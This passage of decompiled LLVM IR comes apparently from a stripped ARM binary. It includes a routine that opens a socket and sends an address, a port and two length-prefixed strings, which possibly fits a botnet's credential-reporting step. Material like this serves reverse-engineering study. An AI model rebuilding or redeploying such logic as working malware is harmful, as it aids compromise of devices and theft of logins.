  %v5_120d0 = call i32 @function_12da0(i32 %v0_120c4, i32 %v3_11a4c, i32 ptrtoint ([8 x i8]* @global_var_161ec.336 to i32), i32 7)
  store i32 %v5_120d0, i32* %r0.global-to-local, align 4
  %v3_120d4 = icmp eq i32 %v5_120d0, -1
  store i1 %v3_120d4, i1* %cpsr_c.global-to-local, align 1
  %v8_120d4 = icmp eq i32 %v5_120d0, -1
  store i1 %v8_120d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_120d0, i32* @r7, align 4
  br i1 %v3_120d4, label %dec_label_pc_1170c.loopexit, label %dec_label_pc_11a98

dec_label_pc_120e4:                               ; preds = %dec_label_pc_11ff0
  store i32 %v2_117d8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_120f0 = add i32 %v0_11fdc, 4
  %v2_120f0 = inttoptr i32 %v1_120f0 to i32*
  %v3_120f0 = load i32, i32* %v2_120f0, align 4
  store i32 %v3_120f0, i32* %r0.global-to-local, align 4
  %v5_120f4 = call i32 @function_13f00(i32 %v3_120f0, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_120f4, i32* %r0.global-to-local, align 4
  store i32 %v2_11fc8, i32* %r1.global-to-local, align 4
  %v0_120fc = load i32, i32* @r5, align 4
  %v1_120fc = add i32 %v0_120fc, 4
  %v2_120fc = inttoptr i32 %v1_120fc to i32*
  %v3_120fc = load i32, i32* %v2_120fc, align 4
  store i32 %v3_120fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11870

dec_label_pc_1210c:                               ; preds = %dec_label_pc_11718
  store i32 %.pre, i32* @r0, align 4
  %v1_12114 = add i32 %v0_1210c, 92
  store i32 %v1_12114, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_1211c = call i32 @function_13cc0(i32 %.pre, i32 %v1_12114, i32 192)
  store i32 %v3_1211c, i32* %r0.global-to-local, align 4
  %v0_12120 = load i32, i32* @r5, align 4
  %v1_12120 = add i32 %v0_12120, 24
  %v2_12120 = inttoptr i32 %v1_12120 to i32*
  %v3_12120 = load i32, i32* %v2_12120, align 4
  store i32 %v3_12120, i32* %r3.global-to-local, align 4
  %v1_12124 = add i32 %v3_12120, -64
  store i32 %v1_12124, i32* %ip.global-to-local, align 4
  store i32 %v1_12124, i32* %v2_12120, align 4
  br label %dec_label_pc_11728

dec_label_pc_12130:                               ; preds = %dec_label_pc_12018
  store i32 %v0_12048, i32* @r0, align 4
  %v0_12134 = call i32 @function_106a4()
  store i32 %v0_12134, i32* %r0.global-to-local, align 4
  %v0_12138 = load i32, i32* @r5, align 4
  %v1_12138 = add i32 %v0_12138, 24
  %v2_12138 = inttoptr i32 %v1_12138 to i32*
  %v3_12138 = load i32, i32* %v2_12138, align 4
  store i32 %v3_12138, i32* %ip.global-to-local, align 4
  %v0_1213c = load i32, i32* @r4, align 4
  store i32 %v0_1213c, i32* @r7, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_12144:                               ; preds = %dec_label_pc_11500, %dec_label_pc_114e4
  %v0_12144 = load i32, i32* @r7, align 4
  %v1_12144 = load i32, i32* @r4, align 4
  %v2_12144 = add i32 %v1_12144, 12
  %v3_12144 = inttoptr i32 %v2_12144 to i32*
  store i32 %v0_12144, i32* %v3_12144, align 4
  %v0_12148 = load i32, i32* @r7, align 4
  %v1_12148 = trunc i32 %v0_12148 to i8
  %v2_12148 = load i32, i32* @r4, align 4
  %v3_12148 = add i32 %v2_12148, 284
  %v4_12148 = inttoptr i32 %v3_12148 to i8*
  store i8 %v1_12148, i8* %v4_12148, align 1
  br label %bb307

dec_label_pc_12150:                               ; preds = %dec_label_pc_1168c, %dec_label_pc_11644
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12154

dec_label_pc_12154:                               ; preds = %dec_label_pc_116b4, %dec_label_pc_12150
  %v0_1215c = phi i32 [ 0, %dec_label_pc_12150 ], [ %v0_11694, %dec_label_pc_116b4 ]
  %v0_12154 = load i32, i32* @r5, align 4
  %v1_12154 = add i32 %v0_12154, 4
  %v2_12154 = inttoptr i32 %v1_12154 to i32*
  %v3_12154 = load i32, i32* %v2_12154, align 4
  store i32 %v3_12154, i32* @r4, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_1215c = inttoptr i32 %v0_12154 to i32*
  store i32 %v0_1215c, i32* %v2_1215c, align 4
  %v0_12160 = load i32, i32* %ip.global-to-local, align 4
  %v1_12160 = load i32, i32* @r5, align 4
  %v2_12160 = add i32 %v1_12160, 24
  %v3_12160 = inttoptr i32 %v2_12160 to i32*
  store i32 %v0_12160, i32* %v3_12160, align 4
  %v0_11584.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11584

dec_label_pc_12168:                               ; preds = %dec_label_pc_11604
  %v0_12168 = load i32, i32* @r5, align 4
  %v1_12168 = add i32 %v0_12168, 4
  %v2_12168 = inttoptr i32 %v1_12168 to i32*
  %v3_12168 = load i32, i32* %v2_12168, align 4
  store i32 %v3_12168, i32* %r0.global-to-local, align 4
  %v1_1216c = call i32 @function_1369c(i32 %v3_12168)
  store i32 %v1_1216c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_12174 = load i32, i32* @r6, align 4
  %v1_12174 = load i32, i32* @r5, align 4
  %v2_12174 = add i32 %v1_12174, 12
  %v3_12174 = inttoptr i32 %v2_12174 to i32*
  store i32 %v0_12174, i32* %v3_12174, align 4
  %v0_12178 = load i32, i32* %r4.global-to-local, align 4
  %v1_12178 = load i32, i32* @r5, align 4
  %v2_12178 = add i32 %v1_12178, 4
  %v3_12178 = inttoptr i32 %v2_12178 to i32*
  store i32 %v0_12178, i32* %v3_12178, align 4
  %v0_1217c = load i32, i32* @r6, align 4
  %v1_1217c = trunc i32 %v0_1217c to i8
  %v2_1217c = load i32, i32* @r5, align 4
  %v3_1217c = add i32 %v2_1217c, 284
  %v4_1217c = inttoptr i32 %v3_1217c to i8*
  store i8 %v1_1217c, i8* %v4_1217c, align 1
  br label %dec_label_pc_115a8

dec_label_pc_12184:                               ; preds = %dec_label_pc_12064
  store i32 %stack_var_-1868.0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_11730, align 4
  br label %dec_label_pc_12080

dec_label_pc_12194:                               ; preds = %dec_label_pc_11e9c
  store i32 2, i32* @r5, align 4
  %v1_12198 = add i32 %v2_11eb8, 4
  %v2_12198 = inttoptr i32 %v1_12198 to i32*
  %v3_12198 = load i32, i32* %v2_12198, align 4
  store i32 %v3_12198, i32* @r4, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v0_121a4 = call i32 @function_fe60()
  store i32 %v0_121a4, i32* %r0.global-to-local, align 4
  %v0_121a8 = load i32, i32* @r8, align 4
  %v1_121a8 = inttoptr i32 %v0_121a8 to i8*
  %v2_121a8 = load i8, i8* %v1_121a8, align 1
  %v3_121a8 = zext i8 %v2_121a8 to i32
  store i32 %v3_121a8, i32* %r1.global-to-local, align 4
  %v2_121ac = call i32 @function_133f8(i32 %v0_121a4, i32 %v3_121a8)
  store i32 %v2_121ac, i32* %r0.global-to-local, align 4
  %v0_121b0 = load i32, i32* @r4, align 4
  %v2_121b0 = and i32 %v2_121ac, 1073741824
  %v3_121b0 = icmp ne i32 %v2_121b0, 0
  store i1 %v3_121b0, i1* %cpsr_c.global-to-local, align 1
  %v4_121b0 = mul i32 %v2_121ac, 4
  %v5_121b0 = add i32 %v0_121b0, %v4_121b0
  %v6_121b0 = inttoptr i32 %v5_121b0 to i32*
  %v7_121b0 = load i32, i32* %v6_121b0, align 4
  store i32 %v7_121b0, i32* %r3.global-to-local, align 4
  %v0_121b4 = load i32, i32* @sl, align 4
  store i32 %v0_121b4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v2_121c0 = inttoptr i32 %v0_121b4 to i32*
  %v3_121c0 = call i32 @function_122cc(i32 19, i32* %v2_121c0)
  %v4_121c0 = inttoptr i32 %v3_121c0 to i8*
  store i32 %v3_121c0, i32* %r0.global-to-local, align 4
  %v2_121c4 = add i32 %v3_121c0, 1
  %v3_121c4 = inttoptr i32 %v2_121c4 to i8*
  %v4_121c4 = load i8, i8* %v3_121c4, align 1
  %v5_121c4 = zext i8 %v4_121c4 to i32
  store i32 %v5_121c4, i32* %r2.global-to-local, align 4
  %v3_121c8 = load i8, i8* %v4_121c0, align 1
  %v4_121c8 = zext i8 %v3_121c8 to i32
  %v4_121cc = mul nuw nsw i32 %v5_121c4, 256
  %v5_121cc = or i32 %v4_121c8, %v4_121cc
  store i32 %v5_121cc, i32* %r3.global-to-local, align 4
  %v1_121d0 = and i32 %v4_121c8, 128
  %v2_121d0 = icmp ne i32 %v1_121d0, 0
  store i1 %v2_121d0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_121c4, i32* %r1.global-to-local, align 4
  %v0_121d4 = load i32, i32* @r8, align 4
  store i32 %v0_121d4, i32* %r0.global-to-local, align 4
  %v6_121e0 = call i32 @function_10120(i32 %v0_121d4)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_121e8 = call i32 @function_122f8(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_121f0 = call i32 @function_122f8(i32 19)
  %v0_121f8 = load i32, i32* @r6, align 4
  store i32 %v0_121f8, i32* %r0.global-to-local, align 4
  %v2_121fc = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_121fc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_12204 = bitcast i32* %stack_var_-92 to %sockaddr*
  %v4_12204 = call i32 @function_13dec(i32 %v0_121f8, %sockaddr* %v3_12204, i32 16)
  store i32 %v4_12204, i32* %r0.global-to-local, align 4
  %v3_12208 = icmp eq i32 %v4_12204, -1
  store i1 %v3_12208, i1* %cpsr_c.global-to-local, align 1
  %v8_12208 = icmp eq i32 %v4_12204, -1
  store i1 %v8_12208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12208, label %dec_label_pc_12210, label %dec_label_pc_12220

dec_label_pc_12210:                               ; preds = %dec_label_pc_12194
  %v0_12210 = load i32, i32* @r6, align 4
  store i32 %v0_12210, i32* %r0.global-to-local, align 4
  %v1_12214 = call i32 @function_1369c(i32 %v0_12210)
  %v0_12218 = load i32, i32* @sl, align 4
  store i32 %v0_12218, i32* %r0.global-to-local, align 4
  %v1_1221c = call i32 @function_14a30(i32 %v0_12218)
  store i32 %v1_1221c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12220

dec_label_pc_12220:                               ; preds = %dec_label_pc_12194, %dec_label_pc_12210
  store i32 %v2_11b44, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12230 = load i32, i32* @r6, align 4
  store i32 %v0_12230, i32* %r0.global-to-local, align 4
  %v0_12234 = load i32, i32* @sl, align 4
  store i32 %v0_12234, i32* %stack_var_-56, align 4
  %v6_12238 = call i32 @function_13f00(i32 %v0_12230, i32* nonnull %stack_var_-56, i32 1, i32 16384)
  store i32 %v2_11bf8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1224c = load i32, i32* @r6, align 4
  store i32 %v0_1224c, i32* %r0.global-to-local, align 4
  %v5_12250 = call i32 @function_13f00(i32 %v0_1224c, i32* nonnull %stack_var_-48, i32 4, i32 16384)
  %v0_12258 = load i32, i32* @r5, align 4
  store i32 %v0_12258, i32* %r2.global-to-local, align 4
  %v2_1225c = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_1225c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12264 = load i32, i32* @r6, align 4
  store i32 %v0_12264, i32* %r0.global-to-local, align 4
  %v5_12268 = call i32 @function_13f00(i32 %v0_12264, i32* nonnull %stack_var_-38, i32 %v0_12258, i32 16384)
  %v0_1226c = load i32, i32* @fp, align 4
  %v1_1226c = add i32 %v0_1226c, 12
  store i32 %v1_1226c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12278 = load i32, i32* @r6, align 4
  store i32 %v0_12278, i32* %r0.global-to-local, align 4
  %v4_1227c = inttoptr i32 %v1_1226c to i32*
  %v5_1227c = call i32 @function_13f00(i32 %v0_12278, i32* %v4_1227c, i32 1, i32 16384)
  store i32 %v5_1227c, i32* %r0.global-to-local, align 4
  %v0_12280 = load i32, i32* @fp, align 4
  %v1_12280 = inttoptr i32 %v0_12280 to i32*
  %v2_12280 = load i32, i32* %v1_12280, align 4
  store i32 %v2_12280, i32* %r1.global-to-local, align 4
  %v1_12284 = add i32 %v0_12280, 12
  %v2_12284 = inttoptr i32 %v1_12284 to i8*
  %v3_12284 = load i8, i8* %v2_12284, align 1
  %v4_12284 = zext i8 %v3_12284 to i32
  store i32 %v4_12284, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1228c = load i32, i32* @r6, align 4
  store i32 %v0_1228c, i32* %r0.global-to-local, align 4
  %v4_12290 = inttoptr i32 %v2_12280 to i32*
  %v5_12290 = call i32 @function_13f00(i32 %v0_1228c, i32* %v4_12290, i32 %v4_12284, i32 16384)
  %v0_12294 = load i32, i32* @fp, align 4
  %v1_12294 = add i32 %v0_12294, 13
  store i32 %v1_12294, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_122a0 = load i32, i32* @r6, align 4
  store i32 %v0_122a0, i32* %r0.global-to-local, align 4
  %v4_122a4 = inttoptr i32 %v1_12294 to i32*
  %v5_122a4 = call i32 @function_13f00(i32 %v0_122a0, i32* %v4_122a4, i32 1, i32 16384)
  %v0_122a8 = load i32, i32* @r6, align 4
  store i32 %v0_122a8, i32* %r0.global-to-local, align 4
  %v0_122ac = load i32, i32* @fp, align 4
  %v1_122ac = add i32 %v0_122ac, 13
  %v2_122ac = inttoptr i32 %v1_122ac to i8*
  %v3_122ac = load i8, i8* %v2_122ac, align 1
  %v4_122ac = zext i8 %v3_122ac to i32
  store i32 %v4_122ac, i32* %r2.global-to-local, align 4
  %v1_122b0 = add i32 %v0_122ac, 4
  %v2_122b0 = inttoptr i32 %v1_122b0 to i32*
  %v3_122b0 = load i32, i32* %v2_122b0, align 4
  store i32 %v3_122b0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_122b8 = inttoptr i32 %v3_122b0 to i32*
  %v5_122b8 = call i32 @function_13f00(i32 %v0_122a8, i32* %v4_122b8, i32 %v4_122ac, i32 16384)
  %v0_122bc = load i32, i32* @r6, align 4
  store i32 %v0_122bc, i32* %r0.global-to-local, align 4
  %v1_122c0 = call i32 @function_1369c(i32 %v0_122bc)
  store i32 %v1_122c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_122c4

dec_label_pc_122c4:                               ; preds = %dec_label_pc_11e80, %dec_label_pc_12220
  %v0_122c4 = load i32, i32* @sl, align 4
  store i32 %v0_122c4, i32* %r0.global-to-local, align 4
  %v1_122c8 = call i32 @function_14a30(i32 %v0_122c4)
  store i32 %v1_122c8, i32* %r0.global-to-local, align 4
  ret i32 %v1_122c8

; uselistorder directives
  uselistorder i32 %v4_121c8, { 1, 0 }
  uselistorder i32 %v5_121c4, { 1, 0, 2 }
  uselistorder i32 %v2_121ac, { 1, 0, 2 }
  uselistorder i32 %v3_120fc, { 1, 0 }
  uselistorder i32 %v5_120d0, { 2, 0, 3, 4, 1 }
  uselistorder i1 %v1_120a0, { 1, 0 }
  uselistorder i32 %v1_12090, { 2, 1, 0 }
  uselistorder i32 %v1_1208c, { 1, 0 }
  uselistorder i32 %v0_12048, { 1, 0, 2 }
  uselistorder i32 %v1_12030, { 2, 1, 0 }
  uselistorder i32 %v0_11fdc, { 1, 2, 0 }
  uselistorder i1 %v7_11f50, { 1, 0 }
  uselistorder i32 %v1_11f4c, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11f44, { 1, 0 }
  uselistorder i8 %v3_11f3c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11f4c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11f28, { 1, 0 }
  uselistorder i1 %v7_11f20, { 1, 0 }
  uselistorder i1 %v7_11f18, { 1, 0 }
  uselistorder i32 %v0_11ef4, { 1, 2, 0 }
  uselistorder i32 %v2_11ee0, { 1, 0 }
  uselistorder i32 %v1_11ee0, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_11ee0, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i1 %v7_11e90, { 1, 0 }
  uselistorder i32 %v3_11e8c, { 1, 0, 2, 3 }
  uselistorder i1 %v2_11e78, { 1, 0 }
  uselistorder i32 %.348, { 1, 0 }
  uselistorder i1 %v7_11e60, { 1, 0 }
  uselistorder i32 %v0_11e5c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_11e3c, { 1, 0, 2 }
  uselistorder i32 %v4_11e38, { 1, 0, 2 }
  uselistorder i1 %v7_11e28, { 1, 0 }
  uselistorder i32 %v0_11e28, { 3, 2, 0, 4, 1 }
  uselistorder i1 %v7_11d44, { 1, 0 }
  uselistorder i32 %v1_11d40, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11d38, { 1, 0 }
  uselistorder i8 %v3_11d30, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11d40, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11d1c, { 1, 0 }
  uselistorder i1 %v7_11d14, { 1, 0 }
  uselistorder i1 %v7_11d0c, { 1, 0 }
  uselistorder i1 %v7_11c90, { 1, 0 }
  uselistorder i32 %v1_11c8c, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11c84, { 1, 0 }
  uselistorder i8 %v3_11c7c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11c8c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11c68, { 1, 0 }
  uselistorder i1 %v7_11c60, { 1, 0 }
  uselistorder i1 %v7_11c58, { 1, 0 }
  uselistorder i1 %v7_11bdc, { 1, 0 }
  uselistorder i32 %v1_11bd8, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11bd0, { 1, 0 }
  uselistorder i8 %v3_11bc8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11bd8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11bb4, { 1, 0 }
  uselistorder i1 %v7_11bac, { 1, 0 }
  uselistorder i1 %v7_11ba4, { 1, 0 }
  uselistorder i1 %v7_11b28, { 1, 0 }
  uselistorder i32 %v1_11b24, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11b1c, { 1, 0 }
  uselistorder i8 %v3_11b14, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11b24, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11b00, { 1, 0 }
  uselistorder i1 %v7_11af8, { 1, 0 }
  uselistorder i1 %v7_11af0, { 1, 0 }
  uselistorder i32 %v0_11a98, { 2, 1, 0 }
  uselistorder i1 %v7_11a90, { 1, 0 }
  uselistorder i1 %v8_11a84, { 1, 0 }
  uselistorder i8 %v3_11a7c, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_11a8c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11a68, { 1, 0 }
  uselistorder i1 %v7_11a60, { 1, 0 }
  uselistorder i32 %v3_11a4c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11a08, { 2, 1, 0 }
  uselistorder i1 %v7_11a00, { 1, 0 }
  uselistorder i1 %v8_119f4, { 1, 0 }
  uselistorder i8 %v3_119ec, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_119fc, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_119d8, { 1, 0 }
  uselistorder i1 %v7_119d0, { 1, 0 }
  uselistorder i1 %v7_119c8, { 1, 0 }
  uselistorder i32 %v3_118b0, { 2, 3, 0, 1 }
  uselistorder i32 %v0_118a0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_11888, { 1, 0 }
  uselistorder i32 %v1_11884, { 1, 0 }
  uselistorder i32 %v1_1187c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_11878, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_11878, { 0, 2, 1 }
  uselistorder i1 %v7_11820, { 1, 0 }
  uselistorder i1 %v2_1180c, { 1, 0, 2 }
  uselistorder i1 %v2_117f4, { 1, 0, 2 }
  uselistorder i32 %v1_11814, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_117e8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_11810, { 1, 0 }
  uselistorder i32 %v2_11818, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_11790, { 4, 19, 5, 17, 6, 18, 7, 16, 8, 15, 9, 14, 10, 13, 3, 0, 11, 12, 20, 2, 1 }
  uselistorder i32 %v1_1176c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_11768, { 1, 0 }
  uselistorder i32 %v5_1174c, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_11738, { 1, 0, 2 }
  uselistorder i32 %v3_11734, { 1, 0, 2 }
  uselistorder i32 %v0_1210c, { 1, 0, 2 }
  uselistorder i32 %v5_116fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_116dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11694, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v3_11674, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_11668, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_115f4, { 2, 1, 0 }
  uselistorder i32 %v3_115f0, { 1, 0 }
  uselistorder i1 %v7_115d8, { 1, 0 }
  uselistorder i32 %v3_115d4, { 5, 4, 2, 1, 0, 6, 7, 3 }
  uselistorder i32 %v0_115c8, { 1, 0 }
  uselistorder i32 %v1_115ac, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_11598, { 2, 1, 0 }
  uselistorder i32 %v3_11594, { 1, 0 }
  uselistorder i32 %v0_11598, { 1, 0 }
  uselistorder i32 %v2_11bf8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11b44, { 4, 5, 3, 2, 6, 7, 1, 0 }
  uselistorder i32 %v2_11fd0, { 1, 2, 0 }
  uselistorder i32 %v2_117d8, { 0, 2, 1 }
  uselistorder i32 %v1_1152c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1152c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11508, { 2, 1, 0 }
  uselistorder i32 %v1_11504, { 1, 0 }
  uselistorder i32 %v0_114d4, { 0, 2, 1 }
  uselistorder i32 %v1_114cc, { 1, 0 }
  uselistorder i1 %v7_11498, { 0, 3, 1, 2 }
  uselistorder i1 %v2_11498, { 1, 2, 0 }
  uselistorder i32 %v2_11490, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_11488, { 1, 0 }
  uselistorder i32 %v1_1146c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_11460, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11460, { 0, 2, 1 }
  uselistorder i32 %v1_11450, { 1, 0 }
  uselistorder i32 %v3_114b4, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %storemerge222, { 1, 0, 2 }
  uselistorder i32 %v2_114c0, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %stack_var_-1868.0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_113a0, { 1, 0 }
  uselistorder i32 %v1_1138c, { 1, 0 }
  uselistorder i32 %v1_11374, { 1, 2, 0 }
  uselistorder i32 %v0_11380, { 0, 3, 2, 1 }
  uselistorder i32 %v0_11344, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_11338, { 2, 1, 0 }
  uselistorder i32 %v1_11314, { 3, 1, 0, 4, 2 }
  uselistorder i32 %v3_112f4, { 1, 2, 0, 3 }
  uselistorder i1 %v2_112ec, { 1, 0 }
  uselistorder i32 %v4_1128c, { 2, 3, 7, 0, 1, 5, 4, 6 }
  uselistorder i32 %v1_111f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_11114, { 1, 0 }
  uselistorder i32 %v1_11110, { 2, 0, 1 }
  uselistorder i32 %v4_110ec, { 1, 0 }
  uselistorder i32 %v5_110d4, { 0, 2, 1 }
  uselistorder i1 %v2_1105c, { 1, 0 }
  uselistorder i1 %v3_11040, { 1, 0, 2 }
  uselistorder i1 %v2_1102c, { 1, 0 }
  uselistorder i1 %v2_11008, { 1, 0 }
  uselistorder i32 %v1_10fb8, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10fa4, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10fa0, { 4, 5, 6, 0, 7, 1, 2, 3, 8 }
  uselistorder i32 %v4_10f90, { 1, 0 }
  uselistorder i32 %v0_10f80, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10f70, { 1, 0 }
  uselistorder i32 %v0_11280, { 0, 1, 2, 5, 6, 7, 9, 3, 4, 8, 10 }
  uselistorder i8* %stack_var_-1884.0, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %stack_var_-1872.0, { 0, 3, 2, 1 }
  uselistorder i32 %v4_10b04, { 1, 0 }
  uselistorder i32 %v0_10af8, { 2, 0, 1, 3 }
  uselistorder i32 %v4_10aa4, { 1, 0 }
  uselistorder i32 %v0_10a9c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10a44, { 3, 2, 0, 1 }
  uselistorder i1 %v7_109e8, { 1, 0 }
  uselistorder i32 %v3_109e0, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_109c8, { 0, 2, 1 }
  uselistorder i32 %v0_109b0, { 2, 1, 0 }
  uselistorder i32 %v0_1098c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge229, { 1, 0 }
  uselistorder i32 %v0_10924, { 3, 1, 2, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 14, 12, 13 }
  uselistorder i32* %stack_var_-92, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 4, 5, 3, 6, 2, 7, 0, 8, 9 }
  uselistorder i32* %stack_var_-56, { 0, 6, 7, 3, 8, 4, 9, 5, 10, 2, 11, 1, 12, 13 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %stack_var_-38, { 0, 2, 1 }
  uselistorder i32 %tmp239, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 63, 64, 45, 36, 65, 66, 67, 68, 69, 13, 14, 46, 47, 48, 49, 0, 1, 2, 3, 15, 103, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 40, 41, 58, 59, 60, 43, 44, 50, 51, 52, 53, 54, 55, 56, 57, 70, 71, 72, 73, 74, 75, 61, 62, 76, 77, 79, 78, 80, 81, 82, 83, 84, 86, 88, 87, 85, 89, 90, 91, 92, 98, 93, 94, 95, 96, 100, 99, 42, 101, 144, 145, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 102, 122, 123, 124, 125, 126, 127, 129, 128, 131, 130, 97, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143 }
